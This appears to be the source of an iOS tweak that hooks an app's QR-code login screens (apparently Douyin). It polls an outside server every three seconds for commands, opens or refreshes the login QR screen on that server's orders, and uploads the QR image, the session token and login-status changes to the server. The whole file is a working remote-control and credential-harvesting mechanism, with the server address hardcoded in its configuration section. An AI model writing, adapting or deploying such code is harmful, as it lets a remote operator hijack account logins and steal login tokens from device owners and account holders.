#import <UIKit/UIKit.h>
#import <objc/runtime.h>

// ========== 前向声明 ==========
@interface AWEQRCodeLoginCoreViewController : UIViewController
- (UIImageView *)qrCodeImageView;
- (void)setQrCodeImageView:(UIImageView *)iv;
- (NSString *)token;
- (void)setToken:(NSString *)token;
- (NSInteger)qrcodeState;
- (void)setQrcodeState:(NSInteger)state;
- (BOOL)isLoginSuccess;
- (void)loadRQCodeImage;
- (void)monitorQRLoginResult:(id)result;
- (UIButton *)refreshBtn;
@end

@interface AWEUserLoginFullScreenPadQRScannerViewController : UIViewController
- (AWEQRCodeLoginCoreViewController *)QRCodeLoginCoreViewController;
@end

// ========== 配置 ==========
// 改成你的服务器地址
static NSString *kServerURL = @"https://rocket.xkcc.vip/api.php";
static NSString *kDeviceID  = nil; // 自动生成

static BOOL isIPad() {
    return [[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPad;
}

static NSString *getDeviceID() {
    if (!kDeviceID) {
        NSString *model = isIPad() ? @"iPad" : @"iPhone";
        NSString *name = [[UIDevice currentDevice] name];
        kDeviceID = [NSString stringWithFormat:@"%@_%@", model, name];
    }
    return kDeviceID;
}

// ========== 全局变量 ==========
static NSTimer *gPollTimer = nil;
static NSMutableDictionary *gActiveVCs = nil; // task_id -> AWEQRCodeLoginCoreViewController
static NSMutableDictionary *gTaskForVC = nil; // vc_ptr -> task_id

// ========== 网络工具 ==========
static void sendGET(NSString *urlStr, void (^callback)(NSDictionary *)) {
    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.timeoutInterval = 10;
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
        if (data && !err) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            if (callback) callback(json);
        }
    }] resume];
}

static void sendPOST(NSString *action, NSDictionary *body, void (^callback)(NSDictionary *)) {
    NSString *urlStr = [NSString stringWithFormat:@"%@?action=%@", kServerURL, action];
    NSURL *url = [NSURL URLWithString:urlStr];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.timeoutInterval = 10;
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *resp, NSError *err) {
        if (data && !err) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            if (callback) callback(json);
        }
    }] resume];
}

// 截取 UIImageView 的图片并转 base64 data URI
static NSString *imageViewToBase64(UIImageView *iv) {
    UIImage *img = iv.image;
    if (!img) return nil;
    NSData *pngData = UIImagePNGRepresentation(img);
    if (!pngData) return nil;
    NSString *b64 = [pngData base64EncodedStringWithOptions:0];
    return [NSString stringWithFormat:@"data:image/png;base64,%@", b64];
}

// 找到最顶层的 VC 用于 present
static UIViewController *topViewController() {
    UIWindow *keyWindow = nil;
    for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
        if (scene.activationState == UISceneActivationStateForegroundActive) {
            for (UIWindow *window in scene.windows) {
                if (window.isKeyWindow) {
                    keyWindow = window;
                    break;
                }
            }
        }
        if (keyWindow) break;
    }
    if (!keyWindow) {
        keyWindow = [UIApplication sharedApplication].windows.firstObject;
    }
    UIViewController *rootVC = keyWindow.rootViewController;
    while (rootVC.presentedViewController) {
        rootVC = rootVC.presentedViewController;
    }
    return rootVC;
}

// ========== 执行命令 ==========
static void handleCommand(NSDictionary *cmd) {
    NSString *type = cmd[@"type"];
    NSString *taskId = cmd[@"task_id"];
    NSString *cmdId = cmd[@"id"];

    if ([type isEqualToString:@"start_login"]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            UIViewController *qrVC = nil;
            BOOL isCoreVCDirect = NO; // 是否直接 present 了 CoreVC

            if (isIPad()) {
                // iPad: 使用全屏 Pad 扫码页（含完整 UI）
                Class scannerClass = objc_getClass("AWEUserLoginFullScreenPadQRScannerViewController");
                if (scannerClass) {
                    qrVC = [[scannerClass alloc] init];
                }
            }

            if (!qrVC) {
                // iPhone 或 iPad fallback: 直接使用核心二维码 VC
                Class coreClass = objc_getClass("AWEQRCodeLoginCoreViewController");
                if (coreClass) {
                    qrVC = [[coreClass alloc] init];
                    isCoreVCDirect = YES;
                }
            }

            if (!qrVC) {
                NSLog(@"[DYComment] ERROR: 无法创建 QR 登录 VC");
                return;
            }

            UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:qrVC];
            nav.modalPresentationStyle = UIModalPresentationFullScreen;

            // 添加关闭按钮（iPhone 直接用 CoreVC 时没有自带导航栏按钮）
            if (isCoreVCDirect) {
                qrVC.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc]
                    initWithTitle:@"关闭"
                    style:UIBarButtonItemStylePlain
                    target:qrVC
                    action:@selector(dy_dismissSelf)];
            }

            UIViewController *topVC = topViewController();
            [topVC presentViewController:nav animated:YES completion:nil];

            // 获取 core VC 引用
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                id coreVC = nil;
                if (isCoreVCDirect) {
                    coreVC = qrVC; // 直接就是 CoreVC
                } else {
                    // iPad: 从容器中取出 CoreVC
                    @try {
                        coreVC = [qrVC performSelector:@selector(QRCodeLoginCoreViewController)];
                    } @catch (NSException *e) {
                        NSLog(@"[DYComment] Failed to get CoreVC: %@", e);
                    }
                }
                if (coreVC) {
                    NSString *ptr = [NSString stringWithFormat:@"%p", coreVC];
                    gActiveVCs[taskId] = coreVC;
                    gTaskForVC[ptr] = taskId;
                    NSLog(@"[DYComment] Registered CoreVC %@ for task %@", ptr, taskId);
                }
            });
        });
    } else if ([type isEqualToString:@"refresh"]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            AWEQRCodeLoginCoreViewController *coreVC = gActiveVCs[taskId];
            if (coreVC) {
                // 模拟点击刷新按钮（更接近真实操作）
                UIButton *refreshBtn = [coreVC refreshBtn];
                if (refreshBtn) {
                    refreshBtn.hidden = NO;
                    [refreshBtn sendActionsForControlEvents:UIControlEventTouchUpInside];
                    NSLog(@"[DYComment] Refresh triggered via button tap for task: %@", taskId);
                } else {
                    // fallback: 直接调用加载方法
                    [coreVC loadRQCodeImage];
                    NSLog(@"[DYComment] Refresh triggered via loadRQCodeImage for task: %@", taskId);
                }
            }
        });
    } else if ([type isEqualToString:@"dismiss"]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            id coreVC = gActiveVCs[taskId];
            if (coreVC) {
                UIViewController *vc = (UIViewController *)coreVC;
                // 向上找到 NavigationController 然后 dismiss
                UIViewController *presented = vc.navigationController ?: vc;
                [presented.presentingViewController dismissViewControllerAnimated:YES completion:nil];
                NSString *ptr = [NSString stringWithFormat:@"%p", coreVC];
                [gActiveVCs removeObjectForKey:taskId];
                [gTaskForVC removeObjectForKey:ptr];
            }
        });
    }

    // 确认命令
    if (cmdId) {
        sendPOST(@"ack_command", @{@"command_id": cmdId}, nil);
    }
}

// 轮询服务器
static void pollServer() {
    NSString *urlStr = [NSString stringWithFormat:@"%@?action=get_command&device_id=%@", kServerURL, getDeviceID()];
    sendGET(urlStr, ^(NSDictionary *json) {
        if ([json[@"code"] intValue] != 0) return;
        NSArray *commands = json[@"commands"];
        for (NSDictionary *cmd in commands) {
            handleCommand(cmd);
        }
    });
}

// ========== Hook ==========

// 给 CoreVC 添加关闭方法（iPhone 直接 present 时用）
%hook AWEQRCodeLoginCoreViewController

%new
- (void)dy_dismissSelf {
    [self.navigationController dismissViewControllerAnimated:YES completion:nil];
}

- (void)viewDidLoad {
    %orig;
    NSLog(@"[DYComment] QRCodeLoginCoreVC viewDidLoad: %@", self);
}

// 二维码图片加载完成
- (void)loadRQCodeImage {
    %orig;
    // 延迟一点等图片渲染完成
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        UIImageView *iv = [self qrCodeImageView];
        NSString *b64 = imageViewToBase64(iv);
        NSString *token = [self token] ?: @"";
        NSString *ptr = [NSString stringWithFormat:@"%p", self];
        NSString *taskId = gTaskForVC[ptr];

        if (b64 && taskId) {
            sendPOST(@"upload_qr", @{
                @"task_id": taskId,
                @"qr_image": b64,
                @"token": token,
            }, nil);
            NSLog(@"[DYComment] QR image uploaded for task: %@", taskId);
        }
    });
}

// 状态变化
- (void)setQrcodeState:(NSInteger)state {
    %orig;
    /*
     * 实际抓包确认的状态值：
     * 1 = 二维码加载中
     * 2 = 待扫码（二维码已显示，持续轮询）
     * 3 = 已扫码，等待确认（推测）
     * 4 = 登录成功（推测）
     * 5 = 登录失败（推测）
     * 6 = 二维码失效/过期
     */
    NSString *ptr = [NSString stringWithFormat:@"%p", self];
    NSString *taskId = gTaskForVC[ptr];
    if (!taskId) return;

    NSString *statusStr = @"pending";
    switch (state) {
        case 1: statusStr = @"pending";    break;  // 加载中
        case 2: statusStr = @"qr_loaded";  break;  // 待扫码
        case 3: statusStr = @"scanned";    break;  // 已扫码
        case 4: statusStr = @"success";    break;  // 登录成功
        case 5: statusStr = @"failed";     break;  // 登录失败
        case 6: statusStr = @"expired";    break;  // 二维码过期
        default: statusStr = [NSString stringWithFormat:@"unknown_%ld", (long)state]; break;
    }

    // state=2 会被频繁调用（轮询），只在首次上报，附带二维码图片
    static NSString *sLastReportedStatus = nil;
    static NSString *sLastReportedTask = nil;
    if ([statusStr isEqualToString:@"qr_loaded"] &&
        [sLastReportedStatus isEqualToString:@"qr_loaded"] &&
        [sLastReportedTask isEqualToString:taskId]) {
        return; // 跳过重复上报
    }
    sLastReportedStatus = statusStr;
    sLastReportedTask = taskId;

    NSMutableDictionary *body = [@{
        @"task_id": taskId,
        @"status": statusStr,
    } mutableCopy];

    // 如果是刷新后重新加载了二维码，附带图片
    if ([statusStr isEqualToString:@"qr_loaded"]) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            UIImageView *iv = [self qrCodeImageView];
            NSString *b64 = imageViewToBase64(iv);
            NSMutableDictionary *b = [@{@"task_id": taskId, @"status": @"qr_loaded"} mutableCopy];
            if (b64) b[@"qr_image"] = b64;
            sendPOST(@"update_status", b, nil);
        });
    } else {
        sendPOST(@"update_status", body, nil);
    }

    NSLog(@"[DYComment] QR state changed: %ld -> %@ (task: %@)", (long)state, statusStr, taskId);
}

// 登录结果监控
- (void)monitorQRLoginResult:(id)result {
    %orig;
    NSString *ptr = [NSString stringWithFormat:@"%p", self];
    NSString *taskId = gTaskForVC[ptr];
    if (!taskId) return;

    BOOL success = [self isLoginSuccess];
    sendPOST(@"update_status", @{
        @"task_id": taskId,
        @"status": success ? @"success" : @"failed",
    }, nil);
    NSLog(@"[DYComment] Login result: %@ (task: %@)", success ? @"SUCCESS" : @"FAILED", taskId);
}

%end

// ========== 初始化 ==========

%ctor {
    gActiveVCs = [NSMutableDictionary new];
    gTaskForVC = [NSMutableDictionary new];

    // 等 App 启动完成后开始轮询
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        NSLog(@"[DYComment] Starting poll timer...");
        gPollTimer = [NSTimer scheduledTimerWithTimeInterval:3.0
                                                      target:[NSBlockOperation blockOperationWithBlock:^{ pollServer(); }]
                                                    selector:@selector(main)
                                                    userInfo:nil
                                                     repeats:YES];
        // 立即执行一次
        pollServer();
    });
}
